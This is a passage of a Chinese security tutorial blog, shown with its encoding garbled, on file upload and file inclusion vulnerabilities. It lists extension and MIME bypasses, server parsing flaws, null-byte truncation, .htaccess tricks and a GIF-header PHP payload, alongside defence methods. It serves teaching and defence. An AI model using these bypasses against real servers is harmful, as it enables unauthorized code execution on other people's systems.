å®‰å…¨è®¾å¤‡çš„é˜²å¾¡</strong></p><p>æœ‰äº›å‚å•†çš„å®‰å…¨äº§å“èƒ½åŸºäºç¡¬ä»¶å±‚é¢å¯¹HTTP å¤´éƒ¨çš„ Referer å­—æ®µå†…å®¹è¿›è¡Œæ£€æŸ¥æ¥å¿«é€Ÿå‡†ç¡®çš„è¯†åˆ« CSRF æ”»å‡»ã€‚</p><h2 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´"><a href="#æ–‡ä»¶ä¸Šä¼ æ¼æ´" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ¼æ´"></a>æ–‡ä»¶ä¸Šä¼ æ¼æ´</h2><h3 id="ä¸€ã€åŸºæœ¬æ¦‚å¿µ-3"><a href="#ä¸€ã€åŸºæœ¬æ¦‚å¿µ-3" class="headerlink" title="ä¸€ã€åŸºæœ¬æ¦‚å¿µ"></a>ä¸€ã€åŸºæœ¬æ¦‚å¿µ</h3><p><strong>æ¼æ´å®šä¹‰</strong></p><p>æ–‡ä»¶ä¸Šä¼ æ¼æ´æ˜¯æŒ‡ç”±äºæœåŠ¡å™¨ç«¯å¯¹äºç”¨æˆ·ä¸Šä¼ éƒ¨åˆ†çš„æ§åˆ¶ä¸ä¸¥æ ¼å¯¼è‡´æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ä¸€ä¸ªæ¶æ„çš„æ–‡ä»¶åˆ°æœåŠ¡å™¨ã€‚ç®€å•ç‚¹è¯´ï¼Œå°±æ˜¯ç”¨æˆ·ç›´æ¥æˆ–è€…é€šè¿‡å„ç§ç»•è¿‡æ–¹å¼å°†WebShellä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸­è¿›è€Œæ‰§è¡Œåˆ©ç”¨ã€‚</p><p><strong>æˆå› </strong></p><p>å¯¼è‡´æ–‡ä»¶ä¸Šä¼ çš„æ¼æ´çš„åŸå› è¾ƒå¤šï¼Œä¸»è¦åŒ…æ‹¬ä»¥ä¸‹å‡ ç±»ï¼š</p><p>æœåŠ¡å™¨é…ç½®ä¸å½“</p><p>å¼€æºç¼–è¾‘å™¨ä¸Šä¼ æ¼æ´</p><p>æœ¬åœ°æ–‡ä»¶ä¸Šä¼ é™åˆ¶è¢«ç»•è¿‡</p><p>è¿‡æ»¤ä¸ä¸¥æˆ–è¢«ç»•è¿‡</p><p>æ–‡ä»¶è§£ææ¼æ´å¯¼è‡´æ–‡ä»¶æ‰§è¡Œ</p><p>æ–‡ä»¶è·¯å¾„æˆªæ–­</p><p>æœåŠ¡å™¨é…ç½®ä¸å½“</p><h3 id="äºŒã€æ–‡ä»¶ä¸Šä¼ æ”»å‡»åˆ†ç±»"><a href="#äºŒã€æ–‡ä»¶ä¸Šä¼ æ”»å‡»åˆ†ç±»" class="headerlink" title="äºŒã€æ–‡ä»¶ä¸Šä¼ æ”»å‡»åˆ†ç±»"></a>äºŒã€æ–‡ä»¶ä¸Šä¼ æ”»å‡»åˆ†ç±»</h3><p><strong>1ã€è½»é‡çº§æ£€æµ‹ç»•è¿‡æ”»å‡»</strong></p><p>ï¼ˆ1ï¼‰ç»•è¿‡javascript å¯¹æ‰©å±•åçš„æ£€æµ‹ï¼š</p><p>ä½¿ç”¨Burpsuiteç­‰åå‘ä»£ç†å·¥å…·ç›´æ¥POSTæ•°æ®åŒ…åˆ°æœåŠ¡ç«¯ï¼Œç»•è¿‡å‰ç«¯æ£€æµ‹ï¼Œå¦‚DVWAä¸­çš„ç»•è¿‡ç¤ºä¾‹ã€‚</p><p>ï¼ˆ2ï¼‰ç»•è¿‡æœåŠ¡ç«¯å¯¹http request åŒ…MIME ç±»å‹æ£€æµ‹ï¼š</p><p>ä½¿ç”¨Burpsuiteç­‰åå‘ä»£ç†å·¥å…·ä¼ªé€ POST æ•°æ®åŒ…åˆ°æœåŠ¡ç«¯ï¼Œç»•è¿‡MIMEæ£€æµ‹ï¼Œå¦‚DVWAä¸­çš„ç»•è¿‡ç¤ºä¾‹ã€‚</p><p><strong>2ã€æ–‡ä»¶å†…å®¹æ£€æµ‹ç»•è¿‡æ”»å‡»</strong></p><p>æ–‡ä»¶åŠ è½½æµ‹è¯•ç»•è¿‡ï¼šå¯¹æ–‡ä»¶è¿›è¡Œä»£ç æ³¨å…¥å†é…åˆä»»æ„è§£æè°ƒç”¨/æ¼æ´ã€‚</p><p><strong>3ã€ä¸Šä¼ æ”»å‡»æ¡†æ¶æ¼æ´åˆ†å±‚ä»¥åŠè·¯å¾„/æ‰©å±•åæ£€æµ‹ç»•è¿‡æ”»å‡»</strong></p><table><thead><tr><th>è½»é‡çº§æ£€æµ‹ç»•è¿‡æ”»å‡»</th><th></th></tr></thead><tbody><tr><td>ç»•è¿‡javascript å¯¹æ‰©å±•åçš„æ£€æµ‹</td><td>ä»£ç å±‚æ¼æ´</td></tr><tr><td>ç»•è¿‡æœåŠ¡ç«¯å¯¹http request åŒ…MIME ç±»å‹æ£€æµ‹</td><td>ä»£ç å±‚æ¼æ´</td></tr></tbody></table><table><thead><tr><th>è·¯å¾„ã€æ‰©å±•åæ£€æµ‹ç»•è¿‡æ”»å‡»</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>é»‘åå•ç»•è¿‡</td><td>ç™½åå•ç»•è¿‡</td><td></td><td></td></tr><tr><td>æ–‡ä»¶åå¤§å°å†™ç»•è¿‡åå•åˆ—è¡¨ç»•è¿‡ç‰¹æ®Šæ–‡ä»¶åç»•è¿‡0x00æˆªæ–­ç»•è¿‡.htaccessæ–‡ä»¶æ”»å‡»PHPæ–‡ä»¶åŒ…å«æ¼æ´Apacheè§£ææ¼æ´IISè§£ææ¼æ´Nginxè§£ææ¼æ´</td><td>ä»£ç å±‚æ¼æ´ä»£ç å±‚æ¼æ´ä»£ç å±‚æ¼æ´ä»£ç å±‚æ¼æ´ä»£ç å±‚æ¼æ´ä»£ç å±‚æ¼æ´åº”ç”¨å±‚æ¼æ´åº”ç”¨å±‚æ¼æ´åº”ç”¨å±‚æ¼æ´</td><td>0x00æˆªæ–­ç»•è¿‡PHPæ–‡ä»¶åŒ…å«æ¼æ´IISè§£ææ¼æ´Nginxè§£ææ¼æ´</td><td>ä»£ç å±‚æ¼æ´ä»£ç å±‚æ¼æ´åº”ç”¨å±‚æ¼æ´åº”ç”¨å±‚æ¼æ´</td></tr></tbody></table><p><strong>4ã€æ–‡ä»¶å†…å®¹æ£€æµ‹ç»•è¿‡æ”»å‡»</strong></p><p>æ–‡ä»¶åŠ è½½ç»•è¿‡ (ä»£ç å±‚æ¼æ´)</p><p>æ”»å‡»æ‰‹æ³•ä¸ç¯èŠ‚å¦‚å›¾ï¼š</p><p><img src="/2019/01/30/å¸¸è§Webæ¼æ´ç±»å‹/1.png" alt="æ–‡ä»¶ä¸Šä¼ æ”»å‡»æ€è·¯å›¾"></p><h3 id="ä¸‰ã€ä¸Šä¼ æ–‡ä»¶ä¸­çš„è§£ææ”»å‡»"><a href="#ä¸‰ã€ä¸Šä¼ æ–‡ä»¶ä¸­çš„è§£ææ”»å‡»" class="headerlink" title="ä¸‰ã€ä¸Šä¼ æ–‡ä»¶ä¸­çš„è§£ææ”»å‡»"></a>ä¸‰ã€ä¸Šä¼ æ–‡ä»¶ä¸­çš„è§£ææ”»å‡»</h3><p><strong>1ã€ç›´æ¥è§£æï¼ˆå‡ ä¹æ²¡æœ‰é˜²å¾¡ï¼‰</strong></p><p>æ¯”å¦‚ç›´æ¥ä¸Šä¼ ä¸€ä¸ªæ‰©å±•åæ˜¯.php çš„æ–‡ä»¶ï¼Œåªéœ€è¦ç®€å•åœ°ç»•è¿‡å®¢æˆ·ç«¯javascript æ£€æµ‹æˆ–è€…æœåŠ¡ç«¯MIME ç±»å‹æ£€æµ‹å°±è¡Œäº†ã€‚</p><p><strong>2ã€é…åˆè§£æ(æœ‰ä¸€å®šç¨‹åº¦çš„é˜²å¾¡)</strong></p><p>å¯ä»¥ç†è§£ä¸ºå…ˆå°†ä»£ç æ³¨å…¥åˆ°æœåŠ¡å™¨ä¸Šï¼Œä¸Šä¼ ä¸€ä¸ªå¸¦æœ‰ä¸€å¥è¯æœ¨é©¬çš„å›¾ç‰‡æˆ–æ–‡ä»¶ï¼Œç­‰å¾…ä¸€ä¸ªè§£æçš„é…åˆæ¥å®ç°æ”»å‡»ã€‚</p><p>(1)ã€æœ¬åœ°æ–‡ä»¶åŒ…å«è§£æï¼šä¸»è¦æ˜¯PHPæœ¬åœ°æ–‡ä»¶åŒ…å«</p><p>(2)ã€.htaccessæ–‡ä»¶è§£æ</p><p>(3)ã€Webåº”ç”¨ç¨‹åºè§£ææ¼æ´ä»¥åŠå…¶åŸç†ï¼š</p><p><strong>1.Apache è§£ææ¼æ´ï¼š</strong></p><p>è§£æï¼š test.php.abcï¼ˆå…¶ä¸­abcä¸ºä»»æ„ä¸å±äºé»‘åå•ä¸”ä¹Ÿä¸å±äºApacheè§£æç™½åå•çš„åç§°ï¼‰</p><p>æè¿°ï¼šä¸€ä¸ªæ–‡ä»¶åä¸ºx1.x2.x3çš„æ–‡ä»¶ï¼ŒApache ä¼šä»x3çš„ä½ç½®å¾€x1çš„ä½ç½®å¼€å§‹å°è¯•è§£æï¼Œå¦‚æœx3ä¸å±äºApacheèƒ½è§£æçš„æ‰©å±•åï¼Œé‚£ä¹ˆApacheä¼šå°è¯•å»è§£æx2çš„ä½ç½®ï¼Œè¿™æ ·         ä¸€ç›´å¾€å‰å°è¯•ï¼Œç›´åˆ°é‡åˆ°ä¸€ä¸ªèƒ½è§£æçš„æ‰©å±•åä¸ºæ­¢ã€‚</p><p><strong>2.IIS è§£ææ¼æ´ï¼š</strong></p><p>è§£æï¼štest.asp/abc æˆ– test.asp;abc å æˆ– abc/def.php ï¼ˆå…¶ä¸­abcã€deféƒ½ä¸ºä»»æ„æ–‡ä»¶åï¼‰</p><p>æè¿°ï¼šIIS6.0åœ¨è§£æaspæ ¼å¼çš„æ—¶å€™æœ‰ä¸¤ä¸ªè§£ææ¼æ´ï¼Œä¸€ä¸ªæ˜¯å¦‚æœç›®å½•ååŒ…å«â€.aspâ€å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆè¿™ä¸ªç›®å½•ä¸‹æ‰€æœ‰çš„æ–‡ä»¶éƒ½ä¼šæŒ‰ç…§aspå»è§£æï¼Œå¦ä¸€ä¸ªæ˜¯åªè¦æ–‡ä»¶åä¸­å«æœ‰â€.asp;â€ä¼šä¼˜å…ˆæŒ‰aspæ¥è§£æï¼›IIS7.0/7.5æ˜¯å¯¹phpè§£ææ—¶æœ‰ä¸€ä¸ªç±»ä¼¼äºNginxçš„è§£ææ¼æ´ï¼Œå¯¹ä»»æ„æ–‡ä»¶ååªè¦åœ¨URL åé¢è¿½åŠ ä¸Šå­—ç¬¦ä¸²â€/ä»»æ„æ–‡ä»¶å.phpâ€å°±ä¼šæŒ‰ç…§phpçš„æ–¹å¼å»è§£æã€‚</p><p><strong>3.Nginx è§£ææ¼æ´ï¼š</strong></p><p>è§£æï¼šabc/def.php æˆ– abc%00.php ï¼ˆå…¶ä¸­abcã€deféƒ½ä¸ºä»»æ„æ–‡ä»¶åï¼‰</p><p>æè¿°ï¼šç›®å‰Nginx ä¸»è¦æœ‰è¿™ä¸¤ç§æ¼æ´ï¼Œä¸€ä¸ªæ˜¯å¯¹ä»»æ„æ–‡ä»¶åï¼Œåœ¨åé¢æ·»åŠ /abc.php çš„è§£ææ¼æ´ï¼Œå¦‚åŸæœ¬æ–‡ä»¶åæ˜¯test.jpgåˆ™å¯ä»¥æ·»åŠ ä¸ºtest.jpg/x.phpè¿›è¡Œè§£ææ”»å‡»ã€‚è¿˜æœ‰ä¸€ç§æ˜¯å¯¹ä½ç‰ˆæœ¬çš„Nginx å¯ä»¥åœ¨ä»»æ„æ–‡ä»¶ååé¢æ·»åŠ %00.php è¿›è¡Œè§£ææ”»å‡»ã€‚</p><p><strong>4.è§£ææ¼æ´æ€»ç»“ï¼š</strong></p><p>Apacheçš„æ‰©å±•åé¡ºåºè§£ææ¼æ´ï¼šApacheè‡ªèº«çš„æ¼æ´</p><p>IISçš„asp è§£ææ¼æ´ï¼šIISè‡ªèº«çš„æ¼æ´</p><p>Nginxçš„%00 è§£ææ¼æ´ï¼šNginxè‡ªèº«çš„æ¼æ´</p><p>php-cgiçš„é»˜è®¤é…ç½®æ¼æ´ï¼šè¿™ç±»ä»¥CGI å½¢å¼è°ƒç”¨phpçš„web åº”ç”¨ç¨‹åºä¸»è¦å‡ºç°åœ¨IISå’ŒNginxï¼›è€ŒApache é€šå¸¸æ˜¯ä»¥module çš„å½¢å¼å»è°ƒç”¨phpï¼Œæ‰€ä»¥å¾ˆå°‘å‡ºç°è¯¥ç±»å‹æ¼æ´ã€‚</p><h3 id="å››ã€æ£€æµ‹æ–¹æ³•"><a href="#å››ã€æ£€æµ‹æ–¹æ³•" class="headerlink" title="å››ã€æ£€æµ‹æ–¹æ³•"></a>å››ã€æ£€æµ‹æ–¹æ³•</h3><p>ç®€å•ç‚¹çš„æ–¹æ³•å°±æ˜¯ç›´æ¥ä¸Šä¼ å„ç§ç±»å‹çš„æ–‡ä»¶ï¼Œå†é€šè¿‡Burpsuiteä¿®æ”¹å„ä¸ªå¯ä»¥ç»•è¿‡çš„æ£€æµ‹å†…å®¹æ¥æ£€æµ‹ã€‚</p><h3 id="äº”ã€é˜²å¾¡æ–¹æ³•"><a href="#äº”ã€é˜²å¾¡æ–¹æ³•" class="headerlink" title="äº”ã€é˜²å¾¡æ–¹æ³•"></a>äº”ã€é˜²å¾¡æ–¹æ³•</h3><p>ç®€å•çš„é˜²å¾¡æ–¹æ³•ä¸ºï¼šè·å–æ–‡ä»¶æ‰©å±•åè¿›è¡Œç™½åå•å¯¹æ¯”ï¼Œç„¶åå¯¹æ–‡ä»¶è¿›è¡Œé‡å‘½åã€‚å½“ç„¶è‹¥å­˜åœ¨è§£ææ¼æ´ç­‰å®¹æ˜“è¢«ç»•è¿‡ï¼Œå…·ä½“ç‚¹çš„é˜²å¾¡æ–¹æ³•å¦‚ä¸‹ï¼š</p><p>1ã€å®¢æˆ·ç«¯JavaScriptæ£€æµ‹ï¼šé€šå¸¸ä¸ºæ£€æµ‹æ–‡ä»¶æ‰©å±•å)</p><p>2ã€æœåŠ¡ç«¯MIME ç±»å‹æ£€æµ‹ï¼šæ£€æµ‹Content-Typeå†…å®¹)</p><p>3ã€æœåŠ¡ç«¯ç›®å½•è·¯å¾„æ£€æµ‹ï¼šæ£€æµ‹è·Ÿpathå‚æ•°ç›¸å…³çš„å†…å®¹</p><p>4ã€æœåŠ¡ç«¯æ–‡ä»¶æ‰©å±•åæ£€æµ‹ï¼šæ£€æµ‹è·Ÿæ–‡ä»¶extension ç›¸å…³çš„å†…å®¹</p><p>ï¼ˆ1ï¼‰ é»‘åå•æ£€æµ‹ï¼š</p><ol><li><p>æ–‡ä»¶åå¤§å°å†™ç»•è¿‡ï¼šå¦‚ AsPï¼ŒpHpã€‚</p></li><li><p>åå•åˆ—è¡¨ç»•è¿‡ï¼šç”¨é»‘åå•é‡Œæ²¡æœ‰çš„åå•ï¼Œå¦‚ asa æˆ– cer ç­‰ã€‚</p></li><li><p>ç‰¹æ®Šæ–‡ä»¶åç»•è¿‡ï¼šæ¯”å¦‚å‘é€çš„ http åŒ…é‡ŒæŠŠæ–‡ä»¶åæ”¹æˆ test.asp. æˆ– test.asp (åé¢ä¸ºç©ºæ ¼)ï¼Œè¿™ç§å‘½åæ–¹å¼åœ¨ Windowsç³»ç»Ÿé‡Œæ˜¯ä¸èƒ½ç›´æ¥ä¿®æ”¹çš„ï¼Œéœ€è¦åœ¨Burpsuiteç­‰ä»£ç†ä¸­è¿›è¡Œä¿®æ”¹ï¼Œç„¶åç»•è¿‡éªŒè¯åï¼Œä¼šè¢«Windowsç³»ç»Ÿè‡ªåŠ¨å»æ‰åé¢çš„ç‚¹å’Œç©ºæ ¼ï¼Œä½†ä¹Ÿåªèƒ½ç”¨åœ¨Windowsç³»ç»Ÿä¸­ã€‚</p></li><li><p>0x00 æˆªæ–­ç»•è¿‡</p></li><li><p>åŒæ‰©å±•åè§£æç»•è¿‡æ”»å‡»ï¼š</p></li></ol><p>(1)åŸºäºWebæœåŠ¡çš„è§£æé€»è¾‘ï¼šå¦‚æœä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶åä¸ºhelp.asp.123ï¼Œæ‰©å±•å123 ä¸åœ¨æ‰©å±•åé»‘åå•ä¸­ä¹Ÿæ²¡åœ¨Apache å¯è§£ææ‰©å±•ååˆ—è¡¨ä¸­ï¼Œæ­¤æ—¶ä¼šå‘å‰æœå¯»ä¸‹ä¸€ä¸ªå¯è§£æçš„æ‰©å±•åï¼Œè‹¥æœå¯»åˆ°.phpï¼Œåˆ™ä¼šä»¥php æ‰§è¡Œã€‚</p><p>(2) åŸºäºWebæœåŠ¡çš„è§£ææ–¹å¼ï¼šå¦‚æœåœ¨Apacheçš„conf é‡Œæœ‰è¿™æ ·ä¸€è¡Œé…ç½® AddHandler php5-script .php è¿™æ—¶åªè¦æ–‡ä»¶åé‡ŒåŒ…å«.php å³ä½¿æ–‡ä»¶åæ˜¯test2.php.jpgä¹Ÿä¼šä»¥php æ¥æ‰§è¡Œã€‚</p><ol start="6"><li><p>å±é™©è§£æç»•è¿‡æ”»å‡»ï¼šåŸºäºWebæœåŠ¡çš„è§£ææ–¹å¼ï¼šå¦‚æœåœ¨Apache çš„conf é‡Œæœ‰è¿™æ ·ä¸€è¡Œé…ç½® AddType application/x-httpd-php .jpg å³ä½¿æ‰©å±•åæ˜¯jpgï¼Œä¸€æ ·èƒ½ä»¥php æ–¹å¼æ‰§è¡Œã€‚</p></li><li><p>.htaccess æ–‡ä»¶æ”»å‡»ï¼šé…åˆåå•åˆ—è¡¨ç»•è¿‡ï¼Œä¸Šä¼ ä¸€ä¸ªè‡ªå®šä¹‰çš„.htaccessï¼Œå°±å¯ä»¥è½»æ¾ç»•è¿‡å„ç§æ£€æµ‹ã€‚</p></li><li><p>è§£æè°ƒç”¨/æ¼æ´ç»•è¿‡ï¼šç›´æ¥é…åˆä¸Šä¼ ä¸€ä¸ªä»£ç æ³¨å…¥è¿‡çš„éé»‘åå•æ–‡ä»¶å³å¯ï¼Œå†åˆ©ç”¨è§£æè°ƒç”¨/æ¼æ´</p></li></ol><p>ï¼ˆ2ï¼‰ ç™½åå•æ£€æµ‹ï¼š</p><ol><li><p>0x00 æˆªæ–­ç»•è¿‡ï¼šå¦‚test.asp%00.jpg çš„æ–¹å¼è¿›è¡Œæˆªæ–­ï¼Œå±äºç™½åå•æ–‡ä»¶ï¼Œå†åˆ©ç”¨æœåŠ¡ç«¯ä»£ç çš„æ£€æµ‹é€»è¾‘æ¼æ´è¿›è¡Œæ”»å‡»</p></li><li><p>è§£æè°ƒç”¨/æ¼æ´ç»•è¿‡ï¼šç›´æ¥é…åˆä¸Šä¼ ä¸€ä¸ªä»£ç æ³¨å…¥è¿‡çš„ç™½åå•æ–‡ä»¶ï¼Œå†åˆ©ç”¨è§£æè°ƒç”¨/æ¼æ´</p></li><li><p>.htaccessæ–‡ä»¶æ”»å‡»ï¼šæ— è®ºæ˜¯é»‘åå•è¿˜æ˜¯ç™½åå•éƒ½å¯ä»¥ç›´æ¥æ”»å‡».htaccess æ–‡ä»¶</p></li></ol><p>å¦‚æœPHP å®‰å…¨æ²¡é…ç½®å¥½ï¼Œå°±å¯ä»¥é€šè¿‡move_uploaded_file å‡½æ•°æŠŠè‡ªå·±å†™çš„.htaccess æ–‡ä»¶è¦†ç›–æ‰æœåŠ¡å™¨ä¸Šçš„ï¼Œè¿™æ ·å°±èƒ½ä»»æ„å®šä¹‰è§£æåå•äº†ã€‚</p><p>5ã€æœåŠ¡ç«¯æ–‡ä»¶å†…å®¹æ£€æµ‹(æ£€æµ‹å†…å®¹æ˜¯å¦åˆæ³•æˆ–å«æœ‰æ¶æ„ä»£ç ) ï¼š</p><p>ï¼ˆ1ï¼‰æ–‡ä»¶å¹»æ•°æ£€æµ‹ï¼š</p><p>ä¸»è¦æ˜¯æ£€æµ‹æ–‡ä»¶å†…å®¹å¼€å§‹å¤„çš„æ–‡ä»¶å¹»æ•°ï¼Œè¦ç»•è¿‡çš„è¯éœ€è¦åœ¨æ–‡ä»¶å¼€å¤´å†™ä¸Šæ£€æµ‹çš„å€¼ï¼Œæ¯”å¦‚å›¾ç‰‡ç±»å‹çš„æ–‡ä»¶å¹»æ•°å¦‚ä¸‹ï¼š</p><p>JPGæ–‡ä»¶ï¼š</p><p><img src="/2019/01/30/å¸¸è§Webæ¼æ´ç±»å‹/3.png" alt="jpgæ–‡ä»¶å¹»æ•°"></p><p>GIFæ–‡ä»¶ï¼š</p><p><img src="/2019/01/30/å¸¸è§Webæ¼æ´ç±»å‹/4.png" alt="gifæ–‡ä»¶å¹»æ•°"></p><p>PNGæ–‡ä»¶ï¼š</p><p><img src="/2019/01/30/å¸¸è§Webæ¼æ´ç±»å‹/5.png" alt="pngæ–‡ä»¶å¹»æ•°"></p><p>ç„¶ååœ¨æ–‡ä»¶å¹»æ•°åé¢åŠ ä¸Šä»£ç å³å¯ã€‚</p><p>ï¼ˆ2ï¼‰æ–‡ä»¶ç›¸å…³ä¿¡æ¯æ£€æµ‹ï¼š</p><p>å›¾åƒæ–‡ä»¶ç›¸å…³ä¿¡æ¯æ£€æµ‹å¸¸ç”¨çš„å°±æ˜¯getimagesize()å‡½æ•°ï¼Œéœ€è¦æŠŠæ–‡ä»¶å¤´éƒ¨åˆ†ä¼ªé€ å¥½ï¼Œå°±æ˜¯åœ¨å¹»æ•°çš„åŸºç¡€ä¸Šè¿˜åŠ äº†ä¸€äº›æ–‡ä»¶ä¿¡æ¯ï¼Œç»“æ„å¦‚ä¸‹ï¼š</p><p>GIF89a </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(...some binary data for image...) </span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line">(... skipping the rest of binary data ...)</span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰æ–‡ä»¶åŠ è½½æ£€æµ‹ï¼š</p><p>ä¸€èˆ¬æ˜¯è°ƒç”¨API æˆ–å‡½æ•°å»è¿›è¡Œæ–‡ä»¶åŠ è½½æµ‹è¯•ï¼Œå¸¸è§çš„æ˜¯å›¾åƒæ¸²æŸ“æµ‹è¯•ï¼Œç”šè‡³æ˜¯è¿›è¡ŒäºŒæ¬¡æ¸²æŸ“ï¼ˆè¿‡æ»¤æ•ˆæœå‡ ä¹æœ€å¼ºï¼‰ã€‚</p><p>å¯¹æ¸²æŸ“/åŠ è½½æµ‹è¯•çš„æ”»å‡»æ–¹å¼ï¼šä»£ç æ³¨å…¥ç»•è¿‡ï¼Œå¯ä»¥ç”¨å›¾åƒå¤„ç†è½¯ä»¶å¯¹ä¸€å¼ å›¾ç‰‡è¿›è¡Œä»£ç æ³¨å…¥ï¼Œä½†æ–‡ä»¶ç»“æ„æ˜¯å®Œæ•´çš„ï¼Œæ¸²æŸ“æµ‹è¯•åŸºæœ¬ä¸Šéƒ½èƒ½ç»•è¿‡ã€‚ç”¨winhexæŸ¥çœ‹æ•°æ®å¯ä»¥åˆ†æå‡ºè¿™ç±»å·¥å…·çš„åŸç†æ˜¯åœ¨ä¸ç ´åæ–‡ä»¶æœ¬èº«çš„æ¸²æŸ“æƒ…å†µä¸‹æ‰¾ä¸€ä¸ªç©ºç™½åŒºè¿›è¡Œå¡«å……ä»£ç ï¼Œä¸€èˆ¬ä¼šæ˜¯å›¾ç‰‡çš„æ³¨é‡ŠåŒºã€‚</p><p>å¯¹äºŒæ¬¡æ¸²æŸ“çš„æ”»å‡»æ–¹å¼ï¼šæ”»å‡»æ–‡ä»¶åŠ è½½å™¨è‡ªèº«ï¼Œå¸¸è§çš„å°±æ˜¯æº¢å‡ºæ”»å‡»ï¼Œä¸Šä¼ æ¶æ„æ–‡ä»¶åæœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶åŠ è½½å™¨ä¼šä¸»åŠ¨è¿›è¡ŒåŠ è½½æµ‹è¯•ï¼ŒåŠ è½½æµ‹è¯•æ—¶è¢«æº¢å‡ºæ”»å‡»æ‰§è¡Œshellcodeæ¯”å¦‚access/mdb æº¢å‡ºï¼›äºŒæ¬¡æ¸²æŸ“ç›¸å½“äºæ˜¯æŠŠåŸæœ¬å±äºå›¾åƒæ•°æ®çš„éƒ¨åˆ†æŠ“äº†å‡ºæ¥ï¼Œå†ç”¨è‡ªå·±çš„API æˆ–å‡½æ•°è¿›è¡Œé‡æ–°æ¸²æŸ“ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­éå›¾åƒæ•°æ®çš„éƒ¨åˆ†ç›´æ¥å°±è¢«éš”ç¦»å¼€äº†ã€‚</p><p>ç¤ºä¾‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">image_gd_open</span><span class="params">(file, extension)</span> </span>&#123; </span><br><span class="line">    extension = str_replace(<span class="string">'jpg'</span>, <span class="string">'jpeg'</span>, extension); </span><br><span class="line">    open_func = <span class="string">'imageCreateFrom'</span>. extension; <span class="comment">//å‡½æ•°åå˜æˆimageCreateFrompng  ä¹‹ç±» </span></span><br><span class="line">    <span class="keyword">if</span> (!function_exists($open_func)) &#123; </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">FALSE</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> open_func(file); <span class="comment">//å˜æˆimagecreatefrompng('/tmp/php0lbTOn') </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="æ–‡ä»¶åŒ…å«æ¼æ´"></a>æ–‡ä»¶åŒ…å«æ¼æ´</h2><h3 id="ä¸€ã€åŸºæœ¬æ¦‚å¿µ-4"><a href="#ä¸€ã€åŸºæœ¬æ¦‚å¿µ-4" class="headerlink" title="ä¸€ã€åŸºæœ¬æ¦‚å¿µ"></a>ä¸€ã€åŸºæœ¬æ¦‚å¿µ</h3><p><strong>æ¼æ´å®šä¹‰</strong></p><p>ç®€å•åœ°è¯´ï¼Œå°±æ˜¯åœ¨é€šè¿‡å‡½æ•°åŒ…å«æ–‡ä»¶æ—¶ï¼Œç”±äºæ²¡æœ‰å¯¹åŒ…å«çš„æ–‡ä»¶åè¿›è¡Œæœ‰æ•ˆçš„è¿‡æ»¤å¤„ç†ï¼Œè¢«æ”»å‡»è€…åˆ©ç”¨ä»è€Œå¯¼è‡´äº†åŒ…å«äº†Webæ ¹ç›®å½•ä»¥å¤–çš„æ–‡ä»¶è¿›æ¥ï¼Œå°±ä¼šå¯¼è‡´æ–‡ä»¶ä¿¡æ¯çš„æ³„éœ²ç”šè‡³æ³¨å…¥äº†æ¶æ„ä»£ç ã€‚</p><p>è¿™é‡Œä¸»è¦é’ˆå¯¹PHPè¯­è¨€ã€‚</p><p><strong>PHPä¸­çš„æ–‡ä»¶åŒ…å«å‡½æ•°</strong></p><p>include()ï¼šåªæœ‰ä»£ç æ‰§è¡Œåˆ°è¯¥å‡½æ•°æ—¶æ‰ä¼šåŒ…å«æ–‡ä»¶è¿›æ¥ï¼Œå‘ç”Ÿé”™è¯¯æ—¶åªç»™å‡ºä¸€ä¸ªè­¦å‘Šå¹¶ç»§ç»­å‘ä¸‹æ‰§è¡Œã€‚</p><p>include_once()ï¼šå’Œinclude()åŠŸèƒ½ç›¸åŒï¼ŒåŒºåˆ«åœ¨äºå½“é‡å¤è°ƒç”¨åŒä¸€æ–‡ä»¶æ—¶ï¼Œç¨‹åºåªè°ƒç”¨ä¸€æ¬¡ã€‚</p><p>require()ï¼šåªè¦ç¨‹åºæ‰§è¡Œå°±åŒ…å«æ–‡ä»¶è¿›æ¥ï¼Œå‘ç”Ÿé”™è¯¯æ—¶ä¼šè¾“å‡ºé”™è¯¯ç»“æœå¹¶ç»ˆæ­¢è¿è¡Œã€‚</p><p>require_once()ï¼šå’Œrequire()åŠŸèƒ½ç›¸åŒï¼ŒåŒºåˆ«åœ¨äºå½“é‡å¤è°ƒç”¨åŒä¸€æ–‡ä»¶æ—¶ï¼Œç¨‹åºåªè°ƒç”¨ä¸€æ¬¡ã€‚</p><p><strong>æ–‡ä»¶åŒ…å«æ¼æ´çš„ä¸€èˆ¬ç‰¹å¾</strong></p><p>?page=a.php</p><p>?home=a.html</p><p>?file=content</p><p><strong>ç›®å½•éå†ï¼ˆDirectory traversalï¼‰å’Œæ–‡ä»¶åŒ…å«ï¼ˆFile includeï¼‰çš„ä¸€äº›åŒºåˆ«</strong></p><p>ç›®å½•éå†æ˜¯å¯ä»¥è¯»å–webæ ¹ç›®å½•ä»¥å¤–çš„å…¶ä»–ç›®å½•ï¼Œæ ¹æºåœ¨äºweb applicationçš„è·¯å¾„è®¿é—®æƒé™è®¾ç½®ä¸ä¸¥ï¼Œé’ˆå¯¹çš„æ˜¯æœ¬ç³»ç»Ÿã€‚</p><p>æ–‡ä»¶åŒ…å«æ˜¯é€šè¿‡includeå‡½æ•°å°†webæ 